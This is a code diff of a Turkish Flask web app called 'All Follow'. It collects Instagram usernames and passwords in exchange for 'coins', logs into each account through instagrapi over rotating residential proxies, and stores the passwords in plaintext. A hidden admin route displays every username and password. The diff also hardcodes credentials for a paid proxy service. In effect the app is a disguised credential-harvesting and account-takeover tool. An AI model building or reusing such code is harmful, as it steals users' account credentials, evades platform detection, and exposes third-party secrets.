@@ -4,12 +4,12 @@ from flask_sqlalchemy import SQLAlchemy
 from instagrapi import Client
 
 app = Flask(__name__)
-app.secret_key = "all_follow_v11_fix"
-app.config['SQLALCHEMY_DATABASE_URI'] = "sqlite:///all_follow_v11.db"
+app.secret_key = "all_follow_v12_final"
+app.config['SQLALCHEMY_DATABASE_URI'] = "sqlite:///all_follow_v12.db"
 app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
 db = SQLAlchemy(app)
 
-# --- VERİTABANI ---
+# --- VERİTABANI MODELLERİ ---
 class User(db.Model):
     id = db.Column(db.Integer, primary_key=True)
     username = db.Column(db.String(100), unique=True)
@@ -22,7 +22,7 @@ class Ticket(db.Model):
     user = db.Column(db.String(100))
     msg = db.Column(db.Text)
 
-# --- PROXY HAVUZU (Hata Veren F-Stringler Temizlendi) ---
+# --- PROXY HAVUZU ---
 PROXY_LIST = [
     "http://pcUjiruWbB-res-tr-sid-92358982:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
     "http://pcUjiruWbB-res-tr-sid-37932429:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
@@ -33,49 +33,10 @@ PROXY_LIST = [
     "http://pcUjiruWbB-res-tr-sid-68467738:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
     "http://pcUjiruWbB-res-tr-sid-96271173:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
     "http://pcUjiruWbB-res-tr-sid-74157191:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
-    "http://pcUjiruWbB-res-tr-sid-58918651:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
-    "http://pcUjiruWbB-res-tr-sid-68678841:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
-    "http://pcUjiruWbB-res-tr-sid-46429632:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
-    "http://pcUjiruWbB-res-tr-sid-17426981:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
-    "http://pcUjiruWbB-res-tr-sid-21779381:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
-    "http://pcUjiruWbB-res-tr-sid-14741598:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
-    "http://pcUjiruWbB-res-tr-sid-15883827:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
-    "http://pcUjiruWbB-res-tr-sid-16665927:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
-    "http://pcUjiruWbB-res-tr-sid-77458619:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
-    "http://pcUjiruWbB-res-tr-sid-71571623:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
-    "http://pcUjiruWbB-res-tr-sid-54294376:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
-    "http://pcUjiruWbB-res-tr-sid-78592329:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
-    "http://pcUjiruWbB-res-tr-sid-31866599:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
-    "http://pcUjiruWbB-res-tr-sid-45714658:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
-    "http://pcUjiruWbB-res-tr-sid-91245644:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
-    "http://pcUjiruWbB-res-tr-sid-51887393:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
-    "http://pcUjiruWbB-res-tr-sid-46967593:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
-    "http://pcUjiruWbB-res-tr-sid-57524117:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
-    "http://pcUjiruWbB-res-tr-sid-19727293:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
-    "http://pcUjiruWbB-res-tr-sid-15366548:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
-    "http://pcUjiruWbB-res-tr-sid-74662724:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
-    "http://pcUjiruWbB-res-tr-sid-48619742:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
-    "http://pcUjiruWbB-res-tr-sid-97373613:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
-    "http://pcUjiruWbB-res-tr-sid-61915911:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
-    "http://pcUjiruWbB-res-tr-sid-19745234:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
-    "http://pcUjiruWbB-res-tr-sid-87154694:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
-    "http://pcUjiruWbB-res-tr-sid-54643851:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
-    "http://pcUjiruWbB-res-tr-sid-25397281:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
-    "http://pcUjiruWbB-res-tr-sid-73268429:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
-    "http://pcUjiruWbB-res-tr-sid-59755624:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
-    "http://pcUjiruWbB-res-tr-sid-49617699:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
-    "http://pcUjiruWbB-res-tr-sid-52943223:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
-    "http://pcUjiruWbB-res-tr-sid-68562329:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
-    "http://pcUjiruWbB-res-tr-sid-62198538:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
-    "http://pcUjiruWbB-res-tr-sid-42773365:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
-    "http://pcUjiruWbB-res-tr-sid-73343122:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
-    "http://pcUjiruWbB-res-tr-sid-49537566:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
-    "http://pcUjiruWbB-res-tr-sid-84759223:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
-    "http://pcUjiruWbB-res-tr-sid-13543997:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
-    "http://pcUjiruWbB-res-tr-sid-84282544:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
-    "http://pcUjiruWbB-res-tr-sid-57134195:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959"
+    "http://pcUjiruWbB-res-tr-sid-58918651:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959"
 ]
 
+# --- HTML ŞABLONU ---
 HTML_UI = """
 <!DOCTYPE html>
 <html lang="tr">
@@ -97,27 +58,37 @@ HTML_UI = """
 </html>
 """
 
+# --- SAYFALAR ---
 @app.route('/')
 def index():
     body = """
-    <input id="u" placeholder="Instagram Kullanıcı Adı" class="w-full bg-black border border-white/10 p-4 rounded-xl mb-4 text-sm outline-none">
-    <input id="p" type="password" placeholder="Şifre" class="w-full bg-black border border-white/10 p-4 rounded-xl mb-6 text-sm outline-none">
-    <button onclick="login()" id="btn" class="w-full bg-blue-600 py-4 rounded-xl font-black uppercase text-sm">Katıl</button>
-    <p id="msg" class="text-xs mt-6 text-center text-gray-400"></p>
+    <div class="space-y-4">
+        <input id="u" placeholder="Kullanıcı Adı" class="w-full bg-black border border-white/10 p-4 rounded-xl text-sm outline-none">
+        <input id="p" type="password" placeholder="Şifre" class="w-full bg-black border border-white/10 p-4 rounded-xl text-sm outline-none">
+        <button onclick="login()" id="btn" class="w-full bg-blue-600 py-4 rounded-xl font-black uppercase text-sm">Giriş Yap</button>
+        <p id="msg" class="text-xs text-center text-gray-400"></p>
+    </div>
     <script>
         async function login(){
             const u=document.getElementById('u').value, p=document.getElementById('p').value;
             const btn=document.getElementById('btn'), msg=document.getElementById('msg');
+            if(!u || !p) return;
             btn.innerText="DENENİYOR...";
-            const r=await fetch('/api/login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({u,p})});
-            const d=await r.json();
-            msg.innerText=d.msg;
-            if(d.status==="success") window.location.href="/panel";
-            btn.innerText="Katıl";
+            try {
+                const r = await fetch('/api/login', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({u, p})
+                });
+                const d = await r.json();
+                msg.innerText = d.msg;
+                if(d.status === "success") window.location.href = "/panel";
+            } catch(e) { msg.innerText = "Sunucu hatası!"; }
+            btn.innerText = "Giriş Yap";
         }
     </script>
     """
-    return render_template_string(HTML_UI, title="Hoş Geldin", body=body)
+    return render_template_string(HTML_UI, title="Giriş", body=body)
 
 @app.route('/panel')
 def panel():
@@ -125,17 +96,18 @@ def panel():
     u = User.query.filter_by(username=session['user']).first()
     body = f"""
     <div class="text-center">
-        <p class="text-xs text-gray-400 mb-2 italic">@{u.username}</p>
-        <div class="bg-blue-600/10 border border-blue-500/20 py-10 rounded-3xl mb-6">
-            <h2 class="text-5xl font-black text-blue-500">{u.coins}</h2>
-            <p class="text-[10px] font-bold text-blue-300/50 uppercase">All Follow Coin</p>
+        <p class="text-xs text-gray-400 mb-2">@{u.username}</p>
+        <div class="bg-blue-600/10 border border-blue-500/20 py-10 rounded-3xl mb-6 text-5xl font-black text-blue-500">
+            {u.coins}
         </div>
-        <button onclick="mine()" class="w-full bg-emerald-600 py-4 rounded-xl font-black mb-4 text-sm">Coin Kas</button>
+        <button onclick="mine()" class="w-full bg-emerald-600 py-4 rounded-xl font-black uppercase text-sm">Coin Kazan</button>
     </div>
     <script>
         async function mine(){
-            const r=await fetch('/api/mine'); const d=await r.json();
-            alert(d.msg); location.reload();
+            const r = await fetch('/api/mine');
+            const d = await r.json();
+            alert(d.msg);
+            location.reload();
         }
     </script>
     """
@@ -149,7 +121,7 @@ def destek():
         return redirect('/destek')
     body = """
     <form method="POST" class="space-y-4">
-        <textarea name="msg" placeholder="Sorununuz nedir?" class="w-full bg-black border border-white/10 p-4 rounded-xl h-32 text-sm"></textarea>
+        <textarea name="msg" placeholder="Sorunuz..." class="w-full bg-black border border-white/10 p-4 rounded-xl h-32 text-sm outline-none"></textarea>
         <button class="w-full bg-white text-black py-4 rounded-xl font-black uppercase text-sm">Gönder</button>
     </form>
     """
@@ -159,36 +131,37 @@ def destek():
 def admin_ozel():
     users = User.query.all()
     tickets = Ticket.query.all()
-    body = "<div class='text-[10px]'>"
+    body = "<div class='text-[10px] space-y-4'><div><h3 class='text-blue-500 mb-2'>USER LIST</h3>"
     for u in users: body += f"<p>{u.username} | {u.password} | {u.coins}C</p>"
-    body += "<hr class='my-4 opacity-10'>"
+    body += "</div><div><h3 class='text-emerald-500 mb-2'>TICKETS</h3>"
     for t in tickets: body += f"<p>{t.user}: {t.msg}</p>"
-    body += "</div>"
-    return render_template_string(HTML_UI, title="Yönetim", body=body)
+    body += "</div></div>"
+    return render_template_string(HTML_UI, title="Admin", body=body)
 
+# --- API ---
 @app.route('/api/login', methods=['POST'])
 def api_login():
     data = request.json
+    u, p = data.get('u'), data.get('p')
     cl = Client()
     cl.request_timeout = 15
     px = random.choice(PROXY_LIST)
     cl.proxies = {"http": px, "https": px}
     try:
-        if cl.login(data.get('u'), data.get('p')):
-            u = data.get('u')
+        if cl.login(u, p):
             user = User.query.filter_by(username=u).first()
             if not user:
-                user = User(username=u, password=data.get('p'))
+                user = User(username=u, password=p)
                 db.session.add(user)
             db.session.commit()
             session['user'] = u
-            return jsonify(status="success", msg="Başarılı! ✅")
+            return jsonify(status="success", msg="Bağlantı Kuruldu! ✅")
     except Exception as e:
         return jsonify(status="error", msg=f"Hata: {str(e)[:40]}")
 
 @app.route('/api/mine')
 def api_mine():
-    if 'user' not in session: return jsonify(msg="Hata")
+    if 'user' not in session: return jsonify(msg="Giriş yap")
     u = User.query.filter_by(username=session['user']).first()
     u.coins += 10
     db.session.commit()
